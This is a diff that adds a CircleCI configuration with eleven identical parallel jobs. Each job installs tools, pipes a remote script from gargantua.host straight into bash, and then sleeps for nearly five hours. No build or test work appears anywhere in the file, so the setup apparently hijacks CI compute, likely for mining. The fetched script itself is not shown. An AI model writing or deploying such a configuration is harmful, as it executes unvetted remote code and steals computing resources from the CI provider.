@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  ulinstarstage:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ulinstarstage10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - ulinstarstage
+      - ulinstarstage1
+      - ulinstarstage2
+      - ulinstarstage3
+      - ulinstarstage4
+      - ulinstarstage5
+      - ulinstarstage6
+      - ulinstarstage7
+      - ulinstarstage8
+      - ulinstarstage9
+      - ulinstarstage10
